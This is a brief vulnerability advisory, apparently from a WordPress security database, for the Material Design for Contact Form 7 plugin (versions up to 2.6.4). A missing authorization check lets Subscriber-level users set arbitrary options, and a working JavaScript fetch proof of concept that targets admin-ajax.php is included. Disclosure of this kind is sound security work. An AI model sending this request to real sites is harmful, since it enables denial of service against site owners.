## WordPress Plugin Vulnerabilities

# Material Design for Contact Form 7 <= 2.6.4 - Subscriber+ Arbitrary Settings Update leading to DoS

### Description

The plugin does not check authorization or that the option mentioned in the notice param belongs to the plugin when processing requests to the cf7md\_dismiss\_notice action, allowing any logged in user (with roles as low as Subscriber) to set arbitrary options to true, potentially leading to Denial of Service by breaking the site.

### Proof of Concept

fetch("http://127.0.0.1:8001/wp-admin/admin-ajax.php", {
"headers": {
"content-type": "application/x-www-form-urlencoded",
},
"body": "action=cf7md\_dismiss\_notice&notice=template",
"method": "POST",
"credentials": "include"
}).then(response => response.text())
.then(data => console.log(data));
